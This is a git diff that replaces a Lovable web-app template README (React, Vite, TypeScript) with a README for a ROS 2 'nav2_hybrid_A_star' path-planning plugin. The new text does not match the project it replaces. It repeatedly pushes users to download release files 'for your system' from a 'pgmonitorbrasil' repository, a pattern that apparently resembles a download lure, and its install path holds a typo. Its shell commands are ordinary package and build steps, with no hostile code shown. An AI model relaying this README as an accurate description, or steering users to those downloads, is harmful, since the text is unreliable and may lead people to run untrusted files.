@@ -1,73 +1,109 @@
-# Welcome to your Lovable project
+# 🚀 nav2_hybrid_A_star - Path Planning Made Easy
 
-## Project info
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/pgmonitorbrasil/nav2_hybrid_A_star/releases)
 
-**URL**: https://lovable.dev/projects/2ac34c6a-d66b-4560-9411-1381f248f300
+## 📋 Overview
 
-## How can I edit this code?
+nav2_hybrid_A_star is a custom path planner plugin designed for ROS 2 Navigation2. This tool helps robots efficiently navigate through complex environments by using a hybrid A* algorithm. It comes with robust features for modular robotic simulation and comparative benchmarking against existing Nav2 algorithms. Whether you're interested in robotics, simulation, or artificial intelligence, this plugin provides a powerful solution for your navigation needs.
 
-There are several ways of editing your application.
+## 🛠️ Features
 
-**Use Lovable**
+- **Hybrid A* Algorithm**: Combines the advantages of A* search with continuous movement for smooth navigation.
+- **Robust Simulation**: Integrates seamlessly with Gazebo for realistic environment modeling.
+- **Benchmarking**: Compare your path planning strategies against built-in Nav2 algorithms.
+- **Modular Design**: Easily extend or modify features based on your requirements.
+- **User-friendly**: Designed for ease of use with clear instructions to get started.
 
-Simply visit the [Lovable Project](https://lovable.dev/projects/2ac34c6a-d66b-4560-9411-1381f248f300) and start prompting.
+## 🏁 System Requirements
 
-Changes made via Lovable will be committed automatically to this repo.
+To use nav2_hybrid_A_star, make sure you have the following on your machine:
 
-**Use your preferred IDE**
+- Operating System: Ubuntu 20.04 or later
+- ROS 2 Distribution: Humble or later
+- Gazebo: A version compatible with your ROS 2 installation
+- Minimum RAM: 4 GB (8 GB recommended)
+- CPU: Dual-core processor or better
 
-If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
+## 🚀 Getting Started
 
-The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)
+Follow these steps to download and run the nav2_hybrid_A_star plugin:
 
-Follow these steps:
+1. **Visit the Releases Page**: Click on the link below to go to the download page.
 
-```sh
-# Step 1: Clone the repository using the project's Git URL.
-git clone <YOUR_GIT_URL>
+   [Download Here](https://github.com/pgmonitorbrasil/nav2_hybrid_A_star/releases)
 
-# Step 2: Navigate to the project directory.
-cd <YOUR_PROJECT_NAME>
+2. **Select the Latest Release**: On the releases page, find the latest version of nav2_hybrid_A_star.
 
-# Step 3: Install the necessary dependencies.
-npm i
+3. **Download the Plugin**: Click on the appropriate file for your system. Save it in a location you can easily access, such as your Downloads folder.
 
-# Step 4: Start the development server with auto-reloading and an instant preview.
-npm run dev
-```
+4. **Extract the Files**: If the downloaded file is in a compressed format (like .zip or .tar.gz), right-click on it and select "Extract".
 
-**Edit a file directly in GitHub**
+5. **Install Dependencies**: Open a terminal and run the following commands to ensure all necessary packages are installed:
 
-- Navigate to the desired file(s).
-- Click the "Edit" button (pencil icon) at the top right of the file view.
-- Make your changes and commit the changes.
+   ```bash
+   sudo apt update
+   sudo apt install -y ros-humble-navigation2 ros-humble-gazebo-ros-pkgs
+   ```
 
-**Use GitHub Codespaces**
+6. **Copy Plugin to the Required Directory**: Move the extracted files to the appropriate directory:
 
-- Navigate to the main page of your repository.
-- Click on the "Code" button (green button) near the top right.
-- Select the "Codespaces" tab.
-- Click on "New codespace" to launch a new Codespace environment.
-- Edit files directly within the Codespace and commit and push your changes once you're done.
+   ```bash
+   mkdir -p ~/ros2_ws/src
+   cp -r /path/to/your/downloaded/navi_hybrid_A_star ~/ros2_ws/src/
+   ```
 
-## What technologies are used for this project?
+   Replace `/path/to/your/downloaded/navi_hybrid_A_star` with the actual path where you extracted the files.
 
-This project is built with:
+7. **Build the Workspace**: Run these commands in your terminal to build the workspace:
 
-- Vite
-- TypeScript
-- React
-- shadcn-ui
-- Tailwind CSS
+   ```bash
+   cd ~/ros2_ws
+   colcon build
+   ```
 
-## How can I deploy this project?
+8. **Source Your Workspace**: After building, you need to source your workspace:
 
-Simply open [Lovable](https://lovable.dev/projects/2ac34c6a-d66b-4560-9411-1381f248f300) and click on Share -> Publish.
+   ```bash
+   source ~/ros2_ws/install/setup.bash
+   ```
 
-## Can I connect a custom domain to my Lovable project?
+9. **Launch the Plugin**: Now you can launch the nav2_hybrid_A_star plugin using the following command:
 
-Yes, you can!
+   ```bash
+   ros2 launch nav2_hybrid_A_star nav2_hybrid_a_star_launch.py
+   ```
 
-To connect a domain, navigate to Project > Settings > Domains and click Connect Domain.
+## 📥 Download & Install
 
-Read more here: [Setting up a custom domain](https://docs.lovable.dev/tips-tricks/custom-domain#step-by-step-guide)
+To get nav2_hybrid_A_star, visit our releases page and select the latest version. You can easily find it here:
+
+[Download Here](https://github.com/pgmonitorbrasil/nav2_hybrid_A_star/releases)
+
+## 📚 Documentation
+
+For detailed documentation on how to use nav2_hybrid_A_star, check the Wiki section of our repository. It includes guides, examples, and troubleshooting tips to help you get the most out of the plugin.
+
+## 🤝 Contributing
+
+We welcome contributions! If you have ideas to improve nav2_hybrid_A_star, feel free to fork the repository and submit a pull request. Your input is valuable to us.
+
+### 🌐 Topics
+
+- astar-algorithm
+- gazebo
+- gazebo-simulator
+- hybridastar
+- nav2
+- nav2-plugins
+- navigation2
+- path-planning
+- robot
+- robotics
+- robotsimulation
+- ros2
+- ros2-humble
+- rviz2
+
+## 📞 Support
+
+If you encounter issues or have questions, please open an issue in the GitHub repository. We’re here to help you troubleshoot and enhance your experience with nav2_hybrid_A_star.
